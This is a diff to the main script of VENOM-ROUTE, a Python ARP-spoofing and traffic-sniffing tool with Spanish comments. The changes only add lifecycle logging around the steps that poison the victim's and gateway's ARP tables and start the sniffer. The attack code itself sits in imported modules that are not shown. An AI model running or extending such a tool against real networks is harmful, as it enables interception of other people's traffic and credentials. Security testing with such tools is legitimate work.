@@ -41,6 +41,9 @@ import ui_utils               # Estilos y colores para consola. Presentación li
 import sniffer_engine         # Motor de sniffing modular que captura tráfico clave para análisis profundo.
 import sniffer_utils          # Herramientas extra para registrar DNS y generar hashes de integridad.
 import anti_sniff_detector    # Detector pasivo de sniffers en la red (interfaces en modo promiscuo).
+import venom_logger           # Log de funcionamiento interno (ciclo de vida, errores).
+
+log = venom_logger.get_logger()
 
 
 
@@ -83,6 +86,10 @@ def mostrar_uso():
 # Funcion que configura entorno previo al ataque
 
 def inicializar_entorno():
+    log.info(
+        "Inicializando entorno: victima=%s gateway=%s interfaz=%s",
+        ip_victima, ip_gateway, interface,
+    )
     ui_utils.check_root()
     network_utils.validar_conectividad(ip_victima, ip_gateway)
     signal.signal(signal.SIGINT, signal_handler)
@@ -92,6 +99,7 @@ def inicializar_entorno():
 
 def signal_handler(sig, frame):
     global stop_spinner
+    log.warning("Interrupción (SIGINT) recibida. Iniciando limpieza...")
     print(f"\n{ui_utils.BOLD_RED}[✘] Interrupción detectada. Deteniendo proceso...{ui_utils.NC}")
     stop_spinner = True
     arp_utils.stop_attack.set()
@@ -117,6 +125,7 @@ def signal_handler(sig, frame):
         sniffer_thread.join()
 
     print(f"{ui_utils.BOLD_GREEN}[✔] Ataque detenido y limpieza completada.{ui_utils.NC}")
+    log.info("Ataque detenido y limpieza completada.")
     sys.exit(0)
 
 # MAIN
@@ -128,6 +137,7 @@ def main():
     global archivo_dns_txt, archivo_hash_pcap, archivo_hash_txt
 
     ui_utils.check_root()
+    log.info("VENOM-ROUTE iniciado.")
     ui_utils.mostrar_banner()
 
 # MODO INTERACTIVO
@@ -198,9 +208,11 @@ def main():
         iptables_utils.activar_masquerade_rule(interface)
 
     if ui_utils.preguntar("¿ENVENENAR TABLAS ARP DE LA VÍCTIMA Y LA GATEWAY?"):
+        log.info("Envenenamiento ARP confirmado por el usuario.")
         arp_utils.spoof_objetivo()
         arp_utils.spoof_gateway()
     else:
+        log.info("Envenenamiento ARP cancelado por el usuario.")
         print(f"{ui_utils.BOLD_RED}[-] Envenenamiento cancelado.{ui_utils.NC}")
         sys.exit(0)
     print()
@@ -209,6 +221,7 @@ def main():
 
 
     print(f"{ui_utils.BOLD_GREEN}[✓] Sistema en modo de escucha{ui_utils.NC}")
+    log.info("Sistema en modo de escucha (sniffer activo).")
     if activar_antinsniff:
         print(f"{ui_utils.YELLOW}[*] Activando módulo anti-sniffer...{ui_utils.NC}")
         anti_sniff_detector.iniciar_anti_sniffer(interface)
